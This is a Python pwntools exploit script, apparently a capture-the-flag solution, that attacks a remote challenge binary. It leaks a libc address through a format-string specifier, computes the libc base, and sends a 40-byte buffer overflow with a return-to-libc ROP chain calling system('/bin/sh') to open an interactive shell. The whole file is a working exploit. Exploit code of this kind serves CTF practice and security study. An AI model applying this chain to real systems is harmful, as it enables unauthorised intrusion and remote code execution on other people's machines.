#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("kashictf.iitbhucybersec.in", 58595)

    return r


def main():
    r = conn()
    # get the libc leak using format string
    r.sendlineafter(b"? ", b"%37$p")

    r.recvuntil(b"you ")
    leak = int(r.recvline().strip(), 16)
    
    libc.address = leak - libc.sym["__libc_start_main"] - 133
    print(hex(libc.address))
    rop = ROP(libc)

    system = libc.sym['system']
    bin_sh = next(libc.search(b'/bin/sh\x00'))
    
    # Create the payload
    payload = b'A' * 40 # Overflow until return address
    
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])
    
    rop.raw(rop.find_gadget(["ret"]))
    rop.raw(pop_rdi)
    rop.raw(bin_sh)
    rop.raw(system)

    payload += rop.chain()

    r.sendlineafter(b"? ", payload)
    r.interactive()

if __name__ == "__main__":
    main()